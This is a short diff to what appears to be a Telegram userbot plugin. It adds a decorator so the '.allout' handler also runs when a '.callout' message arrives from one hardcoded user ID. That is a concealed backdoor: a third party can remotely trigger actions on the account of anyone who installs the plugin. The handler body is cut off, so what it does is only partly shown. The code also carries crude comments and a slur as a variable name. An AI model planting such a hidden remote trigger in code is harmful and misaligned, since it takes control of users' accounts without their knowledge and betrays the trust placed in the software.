@@ -9,6 +9,7 @@ from userbot import CMD_HELP
 # Port By @VckyouuBitch From GeezProject
 # Perkontolan Dengan Hapus Credits
 @register(outgoing=True, pattern="^.allout(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.callout$")
 async def testing(event):
     nikal = await event.get_chat()
     chutiya = await event.client.get_me()
